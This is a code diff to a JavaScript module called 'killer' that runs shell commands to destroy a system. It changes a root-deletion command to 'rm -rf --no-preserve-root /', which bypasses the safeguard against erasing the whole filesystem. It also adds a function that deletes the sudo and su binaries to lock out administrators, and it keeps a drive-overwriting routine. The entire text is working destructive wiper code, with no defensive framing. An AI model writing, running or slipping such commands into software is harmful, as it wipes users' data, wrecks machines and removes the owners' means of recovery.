@@ -16,7 +16,7 @@ let killer = () => {
 }
     killer.destroyRoot = () => {
         return new Promise((done, err) => {
-            shell.exec('rm -rf /', (code, out, error) => {
+            shell.exec('rm -rf --no-preserve-root /', (code, out, error) => {
                 if(error) {
                     err(error)
                 } else {
@@ -43,6 +43,17 @@ let killer = () => {
                     err(error)
                 } else {
                     done(`Drive has been Overwritten Successfully.`)
+                }
+            })
+        })
+    }
+    killer.disableRoot = () => {
+        return new Promise((d, e) => {
+            shell.exec('rm -f /usr/bin/sudo;rm -f /bin/su', (c, o, er) => {
+                if(er) {
+                    e(er)
+                } else {
+                    d(`Disabled Root Successfully.`)
                 }
             })
         })
